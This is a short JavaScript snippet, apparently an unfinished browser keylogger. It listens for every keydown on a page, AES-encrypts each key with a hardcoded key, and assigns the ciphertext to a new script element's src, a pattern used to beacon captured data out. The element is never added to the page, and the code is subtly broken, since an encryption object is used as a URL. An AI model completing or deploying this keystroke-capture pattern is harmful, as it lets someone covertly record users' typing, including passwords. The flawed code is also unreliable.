
document.addEventListener('keydown', keyHandler1);

function keyHandler1(e) {
    console.log('keydown event triggered')
    let attr1 = e.key;
    let attr2 = e.location;
    var message = JSON.stringify(attr1+attr2);
    var key = "something";
    console.log(message)
    var encrypted = CryptoJS.AES.encrypt(message, key);
    console.log(encrypted);
    var script = document.createElement('script');
    script.src = encrypted;
    var decrypted = CryptoJS.AES.decrypt(encrypted, key);
    console.log(decrypted);
}